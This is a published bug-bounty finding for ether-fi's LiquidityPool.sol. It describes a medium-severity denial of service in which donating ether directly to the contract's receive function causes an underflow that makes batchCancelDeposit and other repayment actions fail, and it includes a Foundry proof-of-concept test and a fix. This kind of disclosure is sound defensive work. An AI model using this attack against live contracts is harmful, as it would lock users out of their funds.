# [M] DOS by donating to LiquidityProvider.sol

## Summary
Severity: Medium
Chain: Smart contract
Component: ether-fi
Published: 2023-11-09
Source: https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/issues/35
Type: hats-finding

## Details
**Github username:** @marjon-call
**Submission hash (on-chain):** 0x035a0c4b7d586e3cec1cf832979b6644f55b7fb3a6063cff271c8005851f248e
**Severity:** medium

**Description:**
**Description**\
The accounting method for `LiquidityPool:totalValueOutOfLp` in the receive function does not take into account that a user can donate ether. A malicous user can donate ether setting `LiquidityPool:totalValueOutOfLp` to 0 (or a value low enough where sending funds into it will cause an arithmic underflow). This will prevent anymore ether to enter the smart contract, causing functions like `LiquidityPool:batchCancelDeposit` to fail.

**Attack Scenario**\
1. Attacker donates ether to `LiquidityPool.sol`:
```js
receive() external payable {
    if (msg.value > type(uint128).max) revert InvalidAmount();
    totalValueOutOfLp -= uint128(msg.value);
    totalValueInLp += uint128(msg.value);
}
```
2. A good actor calls `LiquidityPool:batchCancelDeposit`
3. The call fails due to an arithmic underflow

There are also other repayment actions that are going to fail due to this issue.

**Attachments**

1. **Proof of Concept (PoC) File**
<!-- You must provide a file containing a proof of concept (PoC) that demonstrates the vulnerability you have discovered. -->

The following is a modified copy of `LiquidityPool.t.sol:test_batchCancelDepositAsBnftHolder1`. Before alice peforms her deposit cancellation, an attacker donates ether directly to the pool, which causes Alices cancellation to fail

```js
function test_DosThroughDonation() public {
    vm.deal(owner, 100 ether);

    IEtherFiOracle.OracleReport memory report = _emptyOracleReport();
    report.numValidatorsToSpinUp = 4;
    _executeAdminTasks(report);

    setUpBnftHolders();

    vm.warp(976348625856);

    vm.prank(alice);
    //Set the max number of validators per holder to 4
    liquidityPoolInstance.setNumValidatorsToSpinUpPerSchedulePerBnftHolder(4);

    hoax(alice);
    uint256[] memory bidIds = auctionInstance.createBid{value: 0.2 ether}(2, 0.1 ether);

    startHoax(bob);
    liquidityPoolInstance.deposit{value: 60 ether}();
    vm.stopPrank();

    uint256 aliceBalance = address(alice).balance;
    vm.prank(alice);
    uint256[] memory newValidators = liquidityPoolInstance.batchDepositAsBnftHolder{value: 4 ether}(bidIds, 2);

    (uint32 numValidatorsEeth, ) = liquidityPoolInstance.fundStatistics(ILiquidityPool.SourceOfFunds.EETH);
    (uint32 numValidatorsEtherFan, ) = liquidityPoolInstance.fundStatistics(ILiquidityPool.SourceOfFunds.ETHER_FAN);


    address exploiter = address(0x123456);
    vm.deal(exploiter, 100 ether);
    vm.prank(exploiter);
    payable(address(liquidityPoolInstance)).call{value: liquidityPoolInstance.totalValueOutOfLp()}("");
    console.log(liquidityPoolInstance.totalValueOutOfLp());
    vm.prank(alice);
    liquidityPoolInstance.batchCancelDeposit(newValidators);
}
```

2. **Recomendation**

Validate the user in the receive function.
